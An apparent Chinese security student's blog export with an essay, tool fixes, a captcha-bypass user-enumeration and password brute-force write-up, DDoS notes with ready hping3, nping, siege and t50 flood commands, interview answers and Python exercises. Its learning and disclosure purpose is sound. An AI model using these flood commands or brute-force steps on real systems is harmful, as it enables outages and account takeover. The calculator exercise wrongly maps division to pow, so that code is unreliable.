<p>对这个世界最好的思考方式，就是任何一件事都值得抱有怀疑的态度。学霸学会了向高考低头，而你以为自己学会了低头。大概从什么时候起，可能是小学可能是初中，甚至更早。在我生活的年代，小时候我们会偶尔的从杂志上，报纸上，甚至故事会上瞥见一些鸡汤——诸如要学会低头此类的。除此之外，我们还可以从各种途径耳濡目染到传播此类思想的东西，比如新华字典会告诉你“大丈夫能屈能伸”，还有某电视剧会告诉你，人在屋檐下不得不低头……这种例子很多。你一听，嗷，我懂了，原来是这么个意思：我们要学会顺从，要能屈能伸，遇见困难要学会低头，避其锋芒……那你真的懂了吗，你能屈能伸了吗？你的语文老师很凶，你语文课就乖乖的，语文作业认真写；地理老师很和蔼脾气很好，你就上课偷玩手机，作业蒙混过关。这叫欺软怕硬。当你觉得你学会的时候，就应当怀疑自己真的学会了吗？当回到家里面对数十张卷子，头皮发麻，心力交瘁的时候，多数人会选择成全自己，少做几张或者随便做做以满足自己心里或者生理上渴望的需求。少数人会选择牺牲自己，顶着压力和心中的一百个不愿意去做完这些卷子，甚至还会多做。在牺牲高考和牺牲自己之间对应着的是向自己低头还是向高考低头，每个人都会说大丈夫能屈能伸，却没有一个人会告诉你向谁屈向谁伸。普通人向自己屈，学霸向高考屈。</p>
<p>我在大学期间，依旧是一个普通人。走过了大二才开始悔恨当初为什么不好好学习，如今找工作都很不容易。但是，这一次，我学会了低头，向生活低头。不再一腔热血的高呼圣人为上，不再相信“天生我材必有用”这样的志气。因为现实，不是跑到黄鹤楼上写首诗，亦或者喊一句“我辈岂是蓬蒿人”就能自命不凡的。多少人向生活低了头，这样的话早就成为各类毒鸡汤的经典材料了，但是事实确实如此，毒鸡汤这次说的对。小时候老师问你的梦想是什么，小朋友会说我要当老师像老师一样伟大，我要当消防员去消灭火灾，我要当医生造福社会治病救人……20年后，曾经相当老师的孩子觉得老师工资太低于是做了程序员；曾经想当消防员的孩子为了让父母安心终老，考了公务员；曾经相当医生的孩子在面试了很多家医院后发现，名额都是内定的，没有关系根本进不去，只能转行在一家小公司天天做PPT。这才是生活，充满无奈又苦涩。</p>
<p>我宁愿多吃一点亏，也想保留住少时的童真；善良的对待每一件事，因为我觉得世界也会善良对我；不加以揣测，尽力躲避着社会黑暗的一面，乞求不要打破心中的乌托邦……</p>
<p>而现在，每一件事都越来越难了。</p>
]]></content>
      <categories>
        <category>浮生六记</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>pycharm出现大量破浪下划线</title>
    <url>/2020/07/05/pycharm%E5%87%BA%E7%8E%B0%E5%A4%A7%E9%87%8F%E7%A0%B4%E6%B5%AA%E4%B8%8B%E5%88%92%E7%BA%BF/</url>
    <content><![CDATA[<h1 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 问题"></a>0x00 问题</h1><p>最近准备写个简单的扫描器，想通过python+pyqt5实现。看了一些前车之鉴，发现python3.8和QT5有冲突，就换了个3.7的环境。结果一打开pycharm满屏的波浪线。理论上我换个环境，pycharm设置又没动，我也没更新，突然就出现这个问题。</p>
<a id="more"></a>
<img src="/2020/07/05/pycharm出现大量破浪下划线/1.png">
<p>除此之外连if name = main都下划线提示有问题，我就很纳闷。<br>先随便点一个看看提示</p>
<img src="/2020/07/05/pycharm出现大量破浪下划线/2.png">
<p>百度了一下，是语法检查问题，大部分都不符合PEPE8标准，少几个空行就一顿波浪线，这就得吐槽一下，怎么连注释都不放过检查？</p>
<h1 id="0x01-解决"><a href="#0x01-解决" class="headerlink" title="0x01 解决"></a>0x01 解决</h1><p>1、百度CSDN提供的方法<br>pycharm右下角小人头点开，向左拖动就不提示了。确实是不提示了，但是也啥都不检查了。比如我先使用random也不提示没有import了，很麻烦。</p>
<img src="/2020/07/05/pycharm出现大量破浪下划线/6.png">

<p>2、pycharm左上角 file-&gt;setting-&gt;inspection-&gt;python</p>
<img src="/2020/07/05/pycharm出现大量破浪下划线/3.png">
<p>进入修改语法检查设置，可以个性化设置代码检查。<br>但是全是英文还都是专业词汇实在不太好理解，整了半天又不敢乱点。<br>于是我就全都翻译了一遍，记录下来，以便之后再用。</p>
<img src="/2020/07/05/pycharm出现大量破浪下划线/4.png">
<img src="/2020/07/05/pycharm出现大量破浪下划线/5.png">

<p>我自己设置取消了PEP8的编码规范检查，以及空的文档字符串。理论上，颜色浅的，在右侧severity表示为wake warning的都可以取消勾选，影响不大。</p>
]]></content>
      <categories>
        <category>疑难杂症</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>kali环境下dirsearch.py未找到命令</title>
    <url>/2020/06/30/kali%E7%8E%AF%E5%A2%83%E4%B8%8Bdirsearch%E6%9C%AA%E6%89%BE%E5%88%B0%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 问题"></a>0x00 问题</h1><p>将dirsearch移到kali上后 出现如下问题</p>
<img src="/2020/06/30/kali环境下dirsearch未找到命令/1.png">
<a id="more"></a>

<h1 id="0x01-解决"><a href="#0x01-解决" class="headerlink" title="0x01 解决"></a>0x01 解决</h1><p><strong>1、可能是权限问题，尝试更改权限</strong></p>
<img src="/2020/06/30/kali环境下dirsearch未找到命令/2.png">
<p>无效。</p>
<p><strong>2、可能是python问题，尝试更换python版本</strong></p>
<img src="/2020/06/30/kali环境下dirsearch未找到命令/3.png">
<p>无效。<br>以后切换python版本可直接使用<br>update-alternatives –config python （选号）</p>
<p><strong>3、可能是路径问题，尝试放到python目录下</strong></p>
<img src="/2020/06/30/kali环境下dirsearch未找到命令/4.png">
<p>依旧无效</p>
<p><strong>4、命令有错？</strong></p>
<img src="/2020/06/30/kali环境下dirsearch未找到命令/5.png">
<p>运行成功，问题解决</p>
<p>错误指令：dirsearch.py<br>正确指令：./dirsearch.py</p>
<p>结论：我太蠢了</p>
]]></content>
      <categories>
        <category>疑难杂症</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>某站绕过验证码实现用户枚举+密码爆破</title>
    <url>/2020/05/15/%E6%9F%90%E7%AB%99%E7%BB%95%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE-%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇为前几日所挖Web漏洞记录，图中将抹去真实地址，已提交src，过程仅供学习参考。</p>
<a id="more"></a>


<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>该漏洞发现于某商场注册功能处。先通过正常流程注册一个测试账号，账号aaaa1234  密码aaaa1234。</p>
<img src="/2020/05/15/某站绕过验证码实现用户枚举-密码爆破/注册.png">

<p>开burp，挂代理，再次注册，抓包，可以得到注册的请求数据包。如图</p>
<img src="/2020/05/15/某站绕过验证码实现用户枚举-密码爆破/注册抓包.png">

<p>将此包发送到intruder模块，此时不要forward即可保留验证码的时效性，forward后爆破时会提示验证码过期。<br>在intruder模块中我选择了username和email两个参数进行爆破，在此之前通过验证得出如果email已被注册则不论用户名是否存在，都会优先提示“emai已被注册”，所以将email也加入变量。<br>用户名字典就使用常见的字典，然后在其中添加测试号保证最终结果的准确性<br>email字典是我写了一个python脚本生成的随机邮箱字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreatFile</span><span class="params">(array)</span>:</span></span><br><span class="line">    filename = <span class="string">'RandomEmail.txt'</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'w'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> array:</span><br><span class="line">            file.write(j + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreatRndomEmail</span><span class="params">()</span>:</span></span><br><span class="line">    email_end = (<span class="string">'@qq.com'</span>)</span><br><span class="line">    email_array = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        email_start = random.randint(<span class="number">12001</span>,<span class="number">95126445</span>)</span><br><span class="line">        email = str(email_start) + email_end</span><br><span class="line">        email_array.append(email)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> email_array</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    CreatFile(CreatRndomEmail())</span><br></pre></td></tr></table></figure>

<p>start，可见枚举结果，其中length为263时都是提示用户名已存在：</p>
<img src="/2020/05/15/某站绕过验证码实现用户枚举-密码爆破/枚举.png">

<p>将已存在用户名导出到txt，可作为之后爆破密码的字典使用，可以看见测试账号也在其中，说明结果准确</p>
<img src="/2020/05/15/某站绕过验证码实现用户枚举-密码爆破/枚举结果.png">

<p>通过绕过验证码获得了已存在的用户，再前往登录页面进行密码爆破</p>
<img src="/2020/05/15/某站绕过验证码实现用户枚举-密码爆破/登录.png">

<p>输入登录信息后，用将拦截下来的请求包发送至intruder，同样的此时不能将该包forward<br>在intruder模块中对username和password两个变量进行爆破。username字典使用刚才枚举出的结果，password字典可以使用常用弱口令字典。</p>
<img src="/2020/05/15/某站绕过验证码实现用户枚举-密码爆破/爆破结果.png">
<p>可以看见length为217的结果，页面都会返回登录成功，此处只有一个账号成功，就是之前注册的测试账号aaaa1234 ，已经可以确认漏洞存在。<br>至于更多的账号或者密码则可以使用更强大的字典，然此处仅做测试，勿要违法。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>从注册处可以添加手机短信验证码注册，并设置发送验证码的时间间隔</li>
<li>限制同一IP在单位时间内的请求次数</li>
<li>不论是注册处还是登陆都应该增加token和验证码的时效性</li>
<li>对于页面返回，尽量保证回显一致</li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>AboutDDOS</title>
    <url>/2020/05/13/AboutDDOS/</url>
    <content><![CDATA[<h1 id="DOS-DDOS分类"><a href="#DOS-DDOS分类" class="headerlink" title="DOS/DDOS分类"></a>DOS/DDOS分类</h1><pre><code>攻击源 
    • 单攻击源：DOS
    • 多攻击源：DDOS
攻击方式
    • 消耗资源
    • 利用漏洞
攻击目标
    • 带宽上限
    • 协议上限
    • 设备性能上限
    • 应用性能上限
    • 系统性能上限
    • 崩溃系统
    • 崩溃程序</code></pre><a id="more"></a>

<h1 id="常见DOS-DDOS方式"><a href="#常见DOS-DDOS方式" class="headerlink" title="常见DOS/DDOS方式"></a>常见DOS/DDOS方式</h1><h2 id="Smurf"><a href="#Smurf" class="headerlink" title="Smurf"></a>Smurf</h2><p>利用ping广播,将广播回复地址设置成攻击目标地址，从而当前网段下所有主机都会向其回复一个响应信息，导致网络阻塞。<br>如今，大多数网络已经对smurf攻击免疫。</p>
<h2 id="TearDrop"><a href="#TearDrop" class="headerlink" title="TearDrop"></a>TearDrop</h2><p>在数据传输过程中，如果一个数据过大，则数据传输会进行数据包的截断。会对截断位置进行一个标记，等待数据传输完再通过标记对数据进行拼接，从而传输完整的数据。使用TearDrop可以修改数据截断中的标记位置，从而利用截断的偏移让目标死机蓝屏 。<br>TearDrop只针对老系统如win95，安卓2.0，ios6.0等。虽然TearDrop这种攻击已经过时了，但是攻击方式独特，仍有学习的意义。</p>
<h2 id="Syn-flood"><a href="#Syn-flood" class="headerlink" title="Syn_flood"></a>Syn_flood</h2><p>建立一个完整的TCP连接，需要完成一个“三次握手与四次挥手”。在这个过程中，如果向目标请求TCP连接，发送syn包，目标回复后我们不再回复，则对方的TCP连接状态会暂时处于等待回复状态一段时间后才断开，在这段时间里，攻击方请求大量的TCP连接，发送大量的syn包而不对目标的TCP回复进行响应，则对方会有大量TCP连接处于等待回复状态，从而导致对方网络带宽卡死。</p>
<h2 id="Sockstress"><a href="#Sockstress" class="headerlink" title="Sockstress"></a>Sockstress</h2><p>Sockstress攻击发生在建立完整的TCP连接之后。通过返回TCP包设定属性windows窗口值为0，即表示本机暂时没地方接受数据，让对方等待。发送大量该类型的包后对方主机会出现内存飙高，Cpu高占用等状态，从而卡死主机达到目的</p>
<h2 id="DNS放大"><a href="#DNS放大" class="headerlink" title="DNS放大"></a>DNS放大</h2><p>DNS放大攻击通过伪造IP地址向DNS服务器做递归查询，从而DNS服务器向伪造的地址返回大量信息，导致伪造地址目标卡死。<br>DNS放大攻击的优势在与攻击方只需请求很小流量，DNS服务器就能向伪造地址返回大量流量，大大提高了攻击强度和攻击效率。<br>DNS放大攻击需要满足特定条件才能使用：</p>
<ol>
<li>所在网络支持伪造被攻击者IP地址</li>
</ol>
<ol start="2">
<li>DNS服务器支持递归查询</li>
</ol>
<h2 id="SNMP放大"><a href="#SNMP放大" class="headerlink" title="SNMP放大"></a>SNMP放大</h2><p>SNMP放大也是放大攻击的一种，同样利用了小请求大回复的原理。通过伪造IP地址向SNMP服务器做查询，SNMP会返回大量信息到伪造的地址，从而让对方卡死。<br>常用端口161，162</p>
<h2 id="NTP放大"><a href="#NTP放大" class="headerlink" title="NTP放大"></a>NTP放大</h2><p>NTP放大攻击同其余放大攻击原理大致相同，伪造IP地址向NTP服务器进行小流量请求，NTP服务器会向伪造地址放回大量信息。<br>NTP放大需要满足的条件：</p>
<ol>
<li>必须monlist开启</li>
</ol>
<ol start="2">
<li>常用端口123</li>
</ol>
<p>NTP放大攻击的防御措施是：</p>
<ol>
<li>对NTP服务器进行合理的管理和配置，将全部的NTP服务软件升级到最新的版本；         4.2.7p26以上版本</li>
</ol>
<ol start="2">
<li>关闭monlist或者在配置文件中添加noquery参数来限制客户端的monlist等信息查询请求</li>
</ol>
<ol start="3">
<li>通过防火墙对UDP试用的123端口进行限制，只允许NTP服务于固定IP进行通信；</li>
</ol>
<ol start="4">
<li>运用足够大的带宽，硬抗NTP服务产生的放大型流量攻击。</li>
</ol>
<ol start="5">
<li>使用DDoS防御产品，将入口异常访问请求进行过滤清洗，然后将正常的访问请求分发给服务器进行业务处理。</li>
</ol>
<ol start="6">
<li>发现漏洞:<br>ntpdc -n -c 1.1.1.1<br>ntpq -c rv 1.1.1.1<br>ntpdc -c sysinfo 1.1.1.1</li>
</ol>
<h1 id="应用层DOS"><a href="#应用层DOS" class="headerlink" title="应用层DOS"></a>应用层DOS</h1><h2 id="CesarFTP-0-99服务漏洞"><a href="#CesarFTP-0-99服务漏洞" class="headerlink" title="CesarFTP 0.99服务漏洞"></a>CesarFTP 0.99服务漏洞</h2><p>CesarFTP是一款免费FTP服务器端软件，体积小，随装随用，使用方便。<br>CesarFTP 0.99存在缓冲区一处漏洞，通过命令发送大量‘\n’（通过FUZZ测试得出）导致缓冲区溢出从而服务崩溃</p>
<h1 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h1><h2 id="Slowhttptest"><a href="#Slowhttptest" class="headerlink" title="Slowhttptest"></a>Slowhttptest</h2><p>Slowhttptest是依赖HTTP协议的慢速攻击DoS攻击工具，设计的基本原理是服务器在请求完全接收后才会进行处理，如果客户端的发送速度缓慢或者发送不完整，服务端为其保留连接资源池占用，大量此类请求并发将导致DoS。<br>包含四种攻击方式</p>
<ol>
<li>Slowloris：完整的http请求是以\r\n\r\n结尾，攻击时仅发送\r\n，少发送一个\r\n，服务器认为请求还未发完，就会一直等待直至超时。等待过程中占用连接数达到服务器连接数上限，服务器便无法处理其他请求。 </li>
</ol>
<ol start="2">
<li>Slow POST：在HTTP头申明较大content长度，body部分缓慢发送</li>
</ol>
<ol start="3">
<li>Slow Read attack：请求正常发送，慢速读取响应数据，调整TCP连接中window窗口大小（ps：sockstress中将window调为0）</li>
</ol>
<ol start="4">
<li>Apache Range Header attack：耗尽cpu，内存</li>
</ol>
<h2 id="RUDY（Are-u-dead-yet）"><a href="#RUDY（Are-u-dead-yet）" class="headerlink" title="RUDY（Are-u-dead-yet）"></a>RUDY（Are-u-dead-yet）</h2><p>慢攻击DOS<br>利用数据缓慢发送，耗尽目标资源。<br>针对Web，需要有一个表单提交的页面，每次发送一字节慢慢的发。类似于Slowhttptest<br>获取地址 <a href="https://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">https://sourceforge.net/projects/r-u-dead-yet/</a></p>
<h2 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h2><p>hping是面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。利用hping3中组合语法，可以达到DOS的效果</p>
<ol>
<li>Syn Flood:<pre><code>hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 1.1.1.1
hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1</code></pre></li>
<li>ICMP Flood: <pre><code>hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.1</code></pre></li>
<li>UDP Flood: <pre><code>hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.1  </code></pre></li>
<li>TCP Flood: <pre><code>hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1</code></pre></li>
<li>LAND攻击:<pre><code>特殊种类的SynFlood攻击，源地址和目标地址都是受害者 伪造的源地址和目标地址相同，伪造自己给自己发包，自己给自己回包，自己打自己
Hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></pre></li>
<li>TCP全连接DOS:<pre><code>nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1</code></pre></li>
<li>查公网IP<pre><code>nping --echo-client &quot;public&quot; echo.nmap.org --udp</code></pre></li>
</ol>
<h2 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h2><p>siege是一款针对Web http/https性能测试的一款工具，可以用来进行DOS<br>siege -g <a href="http://1.1.1.1/a.php" target="_blank" rel="noopener">http://1.1.1.1/a.php</a>  /  1.1.1.1<br>siege -i -c 1000 <a href="http://1.1.1.1/a.php" target="_blank" rel="noopener">http://1.1.1.1/a.php</a> -A<br>同时攻击多个URL，添加-f 使用字典文件，siege默认的字典/etc/siege/urls.txt</p>
<h2 id="T50"><a href="#T50" class="headerlink" title="T50"></a>T50</h2><p>T50是对Web进行网络性能测试工具，可以用来进行DOS。参数可以指定各种网络协议，包括GRE、ICMP、TCP、UDP……<br>t50 1.1.1.1 –flood –turbo -S -protocol TCP –dport 80  (添加turbo参数将提高攻击能力)</p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>知名网络扫描工具，其内也包含有DOS脚本，存放于 /usr/share/nmap/scripts/script.db</p>
<h2 id="匿名者DOS工具"><a href="#匿名者DOS工具" class="headerlink" title="匿名者DOS工具"></a>匿名者DOS工具</h2><p>由世界知名黑客组织匿名者发布的DOS工具包，包括LOIC,HOIC,XOIC,DDoSer……<br>这些工具使用简单，图形化界面可指定攻击线程，目标地址，端口，攻击方式等等<br>但是都不支持代理，无法隐藏真实IP</p>
<h2 id="HULK"><a href="#HULK" class="headerlink" title="HULK"></a>HULK</h2><p>HTTP Unberable Load King 是一款基于python的DOS工具，HULK随机产生大量唯一的地址请求，可以避免缓存命中，耗尽WEB服务器资源池。<br>源客户的混淆——通过一个User Agent的已知列表，每http一个请求的用户代理都是随机来自于已知列表。<br>引用伪装——指向请求的referer是伪造的，要么指向主机自己，要么指向主要的已知站点。referer是产生请求的url。<br>粘附性——使用标准的http请求去请求服务器，使用变化的的keep-alive时间窗保持连接建立不使用缓存——这是一个前提</p>
<h2 id="GoldenEye"><a href="#GoldenEye" class="headerlink" title="GoldenEye"></a>GoldenEye</h2><p>GoldenEye是一款Layer 7拒绝服务测试工具，基于Python开发。利用的攻击向量：HTTP Keep Alive + NoCache。可指定参数：<br>-u：指定需要使用的user-agent列表文件（默认随机生成）；</p>
<p>-w：指定并行worker数量（默认50）；</p>
<p>-s：指定并行socket数量（默认30）；</p>
<p>-m：指定使用的HTTP方法，“get“、”post“或”random“（默认get）；</p>
<p>-d：启用调试模式，可输出更多的verbose内容（默认False）；</p>
<p>-n：关闭SSL证书验证功能（默认True）；</p>
<p>-h：查看帮助信息</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>DDOS</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.02记某次面试</title>
    <url>/2020/03/02/2020.03.02%E8%AE%B0%E6%9F%90%E6%AC%A1%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>半个月前（2020.2.15）网申21届安服实习，今天面试结束，对提出的问题做一下回顾和总结</p>
<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>1、网投简历<br>2、收到面试短信，约定面试时间<br>3、电话面试</p>
<p>面试全程大概30min</p>
<a id="more"></a>

<h1 id="问题梳理"><a href="#问题梳理" class="headerlink" title="问题梳理"></a>问题梳理</h1><p><strong>1、自我介绍</strong><br>    略<br><strong>2、FTP传输一次要发出几个TCP连接？</strong><br>    FTP传输需要建立连个TCP连接。控制连接和数据连接</p>
<p><strong>3、描述一下DNS解析过程？为什么要使用DNS?</strong><br>    ①浏览器将URL发送给DNS客户端（如本地pc），DNS客户端向DNS服务器发送一份包含域名的报文，DNS服务器根据域名查找对应IP然后返回给DNS客户端，DNS客户端发给浏览器对应的IP，浏览器向该IP发出连接。<br>    ②IP地址不好记，使用域名方便访问和记忆</p>
<p><strong>4、HTTP协议中Referer字段的作用？</strong><br>    在HTTP头中Referer标识来源。第一 防盗链，限定Referer字段可以限制访问，比如只<br>    允许baidu.com访问自己的服务器，那么每次检测Referer只要不为baidu.com就拦截。<br>    第二 防止恶意请求，比如静态请求是*.html结尾的，动态请求是*.shtml，<br>    那么由此可以这么用，所有*.shtml请求，必须Referer为baidu.com</p>
<p><strong>5、上一个回答提到了同源策略，什么是同源策略？为什么XSS不会触发同源策略？</strong><br>    ①同源策略是浏览器的功能，保障浏览安全，不同源的客户端在没有授权下，不能读取其资源。（ps：当时我在回答上个问题时有提到同源策略）<br>    ②有的标签是不受同源策略限制的比如&lt;img&gt;</p>
<p><strong>6、DDOS的软件类型？DDOS原理？TCP DDOS时是什么连接状态？讲一下LOIC中的DDOS类型？服务器被DDOS后是什么样的状态。</strong><br>    ①基于IP、基于ARP、基于ICMP、基于TCP、基于UDP。（我觉得面试官可能想问DDOS的类型，当时没太听懂，就说了我用过LOIC，所以后面问了我LOIC）<br>    ②每种DDOS基本原理大多是利用大量的垃圾报文，垃圾数据传输到目标，导致系统拥塞迟缓<br>    ③TCP DDOS是利用TCP连接的三次握手，发送大量请求包，导致TCP的连接有大量包在等待回复，直到最后资源耗尽（个人理解）<br>    ④在我用的LOIC中，可以选择三种不同的DDOS连接 TCP\UDP\HTTP<br>    ⑤服务器被DDOS，可能出现卡顿、网络不通等情况，同时在网络数据中可以发现大量的垃圾数据包</p>
<p><strong>7、如何判断XSS？哪些标签可以加载JS？哪些事件可以触发弹窗？内标签怎么闭合？</strong><br>    ①我的方法“见框就X”<br>    ②&lt;img&gt;,&lt;iframe&gt;,&lt;script&gt;,&lt;a&gt;(当时说了十几个还没让我停，醉了，估计是想看我极限吧)<br>    ③ alert,onerror,onmourse,onclick,confirm<br>    ④闭合前后尖括号，前后引号。还可以添加优先级高的标签在内部闭合。</p>
<p><strong>8、Web漏洞中你擅长哪些？逻辑漏洞你是怎么挖掘的？给你一个注册页面，可能存在哪些逻辑漏洞？说说你见过最牛逼的逻辑漏洞？</strong><br>    ①逻辑漏洞（当时是逻辑漏洞）<br>    ②逻辑漏洞主要出现在注册，登录，修改信息，付款等地方，我会着重检查这几个点<br>    ③用户枚举，短信轰炸，任意密码找回，任意手机号注册……</p>
<p><strong>9、给你一个网站进行渗透，说一下自己的渗透思路</strong><br>    先熟悉渗透目标，对目标公司进行基本信息查询，包括域名，资产，联系人等。社工可以用到<br>    再对目标进行指纹扫描，可以得到中间件，服务器，框架，cms等信息<br>    进入到主页面大致浏览主要业务模块，简单测试XSS，CSRF，SSRF等。接着更深一步我会从后台入手，进行注入、弱口令测试，如果进入到后台就找上传点Geshell。如果没进入后台，我会从其他方面入手。比如CMS版本漏洞，eweb、fck编辑器漏洞，中间件漏洞等</p>
<p><strong>10、你参加过强网杯和红帽杯，说说比赛中你做出来的印象最深的题</strong><br>    这两个比赛我参加时，没有让我眼前一亮的题目，可能是能力有限这些题对我来说只有难度上的区别，但是我在平时刷题时有遇见让我印象深刻的题目。<br>    这是一道隐写题，首先通过解密图片获取Web地址下载得到俩压缩包，通过题目信息猜出其中一个解压密码，解压出来一音频文件，通过音频频谱高低得到摩斯密码，解摩斯密码得到另一个压缩文件密码，另一个压缩文件中包含四个图片，通过stegsolve处理后并拼接四个图片得到一个二维码，扫描二维码得到flag.<br>    这道题刷新了我对CTF的认知，让我对CTF正视起来。</p>
<p><strong>11、你是怎样学习安全的？你今后会想往哪方面学习和发展</strong><br>    主要通过网络课程自学安全，然后有问题就在小圈子里问大佬。<br>    零碎的时间会看安全公众号以及VX\QQ群获取新的资讯。<br>    干货一点的知识我主要通过加入大佬的知识星球，多看看别人的经验<br>    此外会刷一些靶场，自己动手简单测试一些小站，复现一些漏洞<br>    这些平时的学习我会做一个系统的分类的笔记，慢慢的点满自己的技能树<br>    在Web安全有一定实力后，我有往内网渗透方面发展的意向</p>
<p><strong>12、你还有什么想问的？</strong><br>    略</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>有遗憾，有收获，挺好。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>一些python练习小例</title>
    <url>/2020/02/13/%E4%B8%80%E4%BA%9Bpython%E7%BB%83%E4%B9%A0%E5%B0%8F%E4%BE%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此篇将陆续上传一些平时的python小练习，小算法，都是可执行源码</p>
<p>环境采用 python2.7 和 python3.7</p>
<a id="more"></a>

<h1 id="模块库"><a href="#模块库" class="headerlink" title="模块库"></a>模块库</h1><p><code>operator</code>：这个模块为常规的python运算操作符提供了对应的函数，例如：+ 对应 add<br><code>time</code>：这个模块提供各种与时间相关的函数。返回当前时间，休眠等等。<br><code>heapq - nlargest</code>：nlargest可以帮助我们在某个集合中找出最大的N个元素<br><code>collections - Counter</code>：Counter可以用来跟踪值出现的次数<br><code>os</code>：os是用于访问操作系统功能的模块<br><code>math</code>：math可以用于进行数学操作</p>
<h1 id="正篇"><a href="#正篇" class="headerlink" title="正篇"></a>正篇</h1><h4 id="简易计算器"><a href="#简易计算器" class="headerlink" title="简易计算器"></a>简易计算器</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 简易计算器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">(way,num1,num2)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>&#123;<span class="string">'+'</span>:add,<span class="string">'-'</span>:sub,<span class="string">'*'</span>:mul,<span class="string">'/'</span>:pow&#125;[way](num1,num2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    calculate(<span class="string">'+'</span>,<span class="number">1</span>,<span class="number">2</span>)  <span class="comment">#  1 + 2 = 3</span></span><br></pre></td></tr></table></figure>

<h4 id="去掉最大最小值求平均"><a href="#去掉最大最小值求平均" class="headerlink" title="去掉最大最小值求平均"></a>去掉最大最小值求平均</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 去掉最大最小值求平均</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        list.append(input(<span class="string">'input your No.&#123;&#125; number in this list'</span>.format(i)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] In the calculation......\n'</span>,<span class="string">'[+] Get rid of the maximum\n'</span>,<span class="string">'[+] Get rid of the minimum\n'</span>,<span class="string">'[+] Calculate the final result......\n'</span></span><br><span class="line"></span><br><span class="line">    list.sort()</span><br><span class="line">    list2 = list[<span class="number">1</span>:<span class="number">8</span>]</span><br><span class="line">    result = round((sum(list2)/len(list2)),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] The end result is &#123;&#125;\n'</span>.format(result),<span class="string">'[-] Thanks for your use !'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

